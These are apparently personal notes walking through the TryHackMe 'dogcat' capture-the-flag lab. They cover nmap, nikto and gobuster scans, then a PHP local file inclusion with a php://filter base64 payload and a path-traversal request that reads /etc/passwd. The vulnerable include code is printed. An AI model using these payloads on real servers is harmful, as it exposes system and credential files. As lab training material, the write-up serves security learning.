                           dogcat
                    ======================
I made a website where you can look at pictures of dogs and/or cats
! Exploit a PHP application via LFI and break out of a docker 
container.					

https://tryhackme.com/hacktivities/search
 
https://tryhackme.com/room/dogcat
 
          walkthrough video (John Hammond)
                       ==============
https://www.youtube.com/watch?v=u_uuk7FWWF4&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=6
   
export IP=10.10.157.124
ping $IP
 
  
---------------    nmap      -------------------  Network Scanning
nmap -sC -sV -oN  map.txt $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

The classic ports 22 & 80.  
------------------ nikto ----------------------
nikto -h http://$ip

+ /: Retrieved x-powered-by header: PHP/7.4.3.
+ /: The anti-clickjacking X-Frame-Options header is not present.  
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. 

-------------------
 HP 7.4.3 rings a bell to me as having a vulnerability, and a quick google confirms this

Let’s use gobuster to find some additional subdirectories:

------------- gobuster-------------------
gobuster dir -u http://$ip  -w  /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php, html,txt -t 60
    -
 

    dir to specify the scan should be done against directories and files
    -u to specify the target URL
    -w to specify the word list to use
    -x to specify the extensions to enumerate
    -t to specify the number of concurrent threads


/.                    (Status: 200) [Size: 418]
/index.php            (Status: 200) [Size: 418]
/cat.php              (Status: 200) [Size: 26]
/dogs                 (Status: 301) [Size: 313] [--> http://10.10.157.124/dogs/]
/cats                 (Status: 301) [Size: 313] [--> http://10.10.157.124/cats/]
/dog.php              (Status: 200) [Size: 26]
/flag.php             (Status: 200) [Size: 0]




sorce code of http://$ip

we sould notice the commands :
   <img src="cats/4.jpg">
accessing /cats is forbidden — but using the format we found in the source code,

 /cats/4.jpg gives us access. This could be crucial for if we find a way to upload a file.

lets try http://$IP/?view=dogs
 output:
  Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

 Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on 

    We gain following info:
-------------
  1     We are currently in the /var/www/html/ directory.
  2     We are currently accessing index.php and trying to include another file.
  3     It appends .php to the parameter value: dogs => dogs.php.

Appending .php means we are limited to read PHP files.
The only PHP files we sure exist are index.php, dog.php, and cat.php.
       so the path to index,php from the current directory is:
         	   /../../../../index.php
Reading index.php will be useful because we can understand the PHP code used behind the scenes.


we can assume when we searching ?view=dog ,a file dog.php is executing to send random dogs pictures to the client

At this point, I considered attempting to include index.php itself:

http://dogcat.thm/?view=dog/../../../../index

But since PHP files are executed on the server side, their source code isn’t displayed in the browser.
 Instead, the server simply runs the code and returns the output, so including a PHP file like index.php won’t reveal its contents directly.

To bypass the issue of PHP files being executed instead of displayed, we can use a trick involving PHP stream wrappers. PHP provides special wrappers that alter how files are read. One such wrapper is:
                   php://filter


This allows us to apply filters to a file’s content before it’s processed. 
By using the convert.base64 encode filter, we can encode the raw source code of a file in Base64 effectively allowing us to view the code instead of executing it.

For example, to read the contents of index.php, we could use the following payload:

?view=php://filter/read=convert.base64-encode/resource=index

However, due to the restriction that only allows dog or cat as input, we need to include a valid directory prefix in the path. So, I modified the payload as follows:
?view=php://filter/convert.base64-encode/resource=dog/../index


This successfully returned:
a very log string which is the base64 of the php code.
we will translate it using the command

echo  $STR | base64 -d
output 

the page part of the source code is :
 <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php'; // add  the .php extension 
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>


The code checks if the view parameter contains "dog" or "cat" and includes the corresponding file. Additionally, the script allows clients to specify a custom file extension via the ext parameter. If the ext parameter is not provided, the script defaults to appending .php to the included file. This introduces the possibility of including files with different extensions, making it a potential attack vector for exploiting Local File Inclusion (LFI) vulnerabilities.

Now that we understand how the application works, we can manipulate the parameters to request files with different extensions. For example, we can query:

    ?view=dog&ext=.txt to include dog.txt
    ?view=dog&ext=.py to include dog.py
    ?view=dog&ext= to include dog with no extension, etc.

To exploit this for Local File Inclusion (LFI), we can upgrade our payload to bypass the default .php extension. By using path traversal and the ext parameter, we can craft the following request to read the /etc/passwd file:

?view=dog/../../../../../../../etc/passwd&ext=


LFI = Local File Includes 
https://apt2002.medium.com/tryhackme-dogcat-ctf-detailed-walkthrough-cd746fd232ef
https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=355
 Question Hint



1. What is flag 1?
Hint: There's more to *view* than just cats and dogs... 